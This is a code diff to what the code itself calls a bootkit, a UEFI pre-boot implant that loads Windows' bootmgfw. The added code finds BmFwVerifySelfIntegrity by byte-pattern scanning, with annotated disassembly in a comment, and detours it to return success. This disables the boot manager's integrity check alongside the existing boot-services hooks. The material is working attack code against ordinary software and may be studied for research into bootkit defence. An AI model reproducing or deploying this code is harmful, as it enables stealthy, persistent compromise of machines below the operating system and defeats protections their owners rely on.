@@ -167,6 +167,54 @@ static void HookBootServices()
     gBS->OpenProtocol = OpenProtocolHook;
 }
 
+typedef uint32_t (*BmFwVerifySelfIntegrity_t)();
+static BmFwVerifySelfIntegrity_t BmFwVerifySelfIntegrity = nullptr;
+static uint8_t BmFwVerifySelfIntegrityOriginal[DetourSize];
+
+static uint32_t BmFwVerifySelfIntegrityHook()
+{
+    DetourRestore(BmFwVerifySelfIntegrity, BmFwVerifySelfIntegrityOriginal);
+    return 0;
+}
+
+static void HookBootmgfw(void* ImageBase, uint64_t ImageSize)
+{
+    /*
+    bootmgfw!BmFwVerifySelfIntegrity
+    .text:000000001002AE5C 89 4C 24 08           mov     [rsp-30h+arg_0], ecx
+    .text:000000001002AE60 55                    push    rbp
+    .text:000000001002AE61 53                    push    rbx
+    .text:000000001002AE62 56                    push    rsi
+    .text:000000001002AE63 57                    push    rdi
+    .text:000000001002AE64 41 55                 push    r13
+    .text:000000001002AE66 41 56                 push    r14
+    .text:000000001002AE68 48 8B EC              mov     rbp, rsp
+    .text:000000001002AE6B 48 83 EC 68           sub     rsp, 68h
+    .text:000000001002AE6F 48 8B 05 FA 71 13 00  mov     rax, cs:BootDevice
+    .text:000000001002AE76 33 FF                 xor     edi, edi
+    .text:000000001002AE78 48 83 65 C8 00        and     qword ptr [rbp+Device.Type], 0
+    .text:000000001002AE7D 48 83 65 48 00        and     [rbp+arg_10], 0
+    We try to find this first:
+    .text:000000001002AE82 83 4D 38 FF           or      [rbp+arg_0], 0FFFFFFFFh
+    .text:000000001002AE86 83 4D 40 FF           or      [rbp+a1], 0FFFFFFFFh
+    */
+    auto VerifySelfIntegrityMid = FIND_PATTERN(ImageBase, ImageSize, "\x83\x4D\xCC\xFF\x83\x4D\xCC\xFF");
+    if (VerifySelfIntegrityMid == nullptr)
+    {
+        Die();
+    }
+
+    // Find the function start (NOTE: would be cleaner to use the RUNTIME_FUNCTION in the exception directory)
+    // mov [rsp+8], ecx
+    BmFwVerifySelfIntegrity = (BmFwVerifySelfIntegrity_t)FIND_PATTERN(VerifySelfIntegrityMid - 0x30, ImageSize - (VerifySelfIntegrityMid - (uint8_t*)ImageBase), "\x89\x4C\x24\x08");
+    if (BmFwVerifySelfIntegrity == nullptr)
+    {
+        Die();
+    }
+
+    DetourCreate(BmFwVerifySelfIntegrity, BmFwVerifySelfIntegrityHook, BmFwVerifySelfIntegrityOriginal);
+}
+
 static EFI_STATUS LoadBootManager()
 {
     // Query bootmgfw from the filesystem
@@ -224,11 +272,13 @@ EFI_STATUS EFIAPI EfiEntry(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable
         // Fix relocations manually
         auto NtHeaders = GetNtHeaders(ImageBase);
         auto NtImageBase = NtHeaders->OptionalHeader.ImageBase;
+        auto OriginalImageSize = (uint8_t*)EfiImage->ImageBase - (uint8_t*)ImageBase;
 
         if (FixRelocations(ImageBase, (uint64_t)ImageBase - (uint64_t)NtImageBase))
         {
-            // Install boot services hook
+            // Install the hooks
             HookBootServices();
+            HookBootmgfw(EfiImage->ImageBase, OriginalImageSize);
 
             // Call the original entry point (embedded in the bootkit PE)
             auto OriginalEntryRva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
